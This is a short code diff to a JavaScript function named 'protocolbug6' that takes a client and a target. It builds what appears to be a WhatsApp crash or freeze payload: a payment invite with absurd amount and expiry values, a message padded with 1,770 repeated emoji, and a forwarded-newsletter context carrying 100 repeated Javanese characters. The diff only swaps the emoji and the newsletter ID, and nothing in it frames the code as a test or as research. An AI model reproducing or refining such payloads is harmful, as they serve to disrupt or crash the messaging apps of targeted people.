@@ -29,7 +29,7 @@ async function protocolbug6(client, target, mention = false) {
       currencyCodeIso4217: "USD",
       amount1000: "999999999",
       expiryTimestamp: "9999999999",
-      inviteMessage: "Payment Invite" + "💥".repeat(1770),
+      inviteMessage: "Payment Invite" + "✨".repeat(1770),
       serviceType: 1
     }
   };
@@ -84,7 +84,7 @@ async function protocolbug6(client, target, mention = false) {
       mentionedJid: mentionedList
     },
     forwardedNewsletterMessageInfo: {
-      newsletterJid: "120363321780343299@newsletter",
+      newsletterJid: "120363423084862852@newsletter",
       serverMessageId: 1,
       newsletterName: "ꦾ".repeat(100)
     },
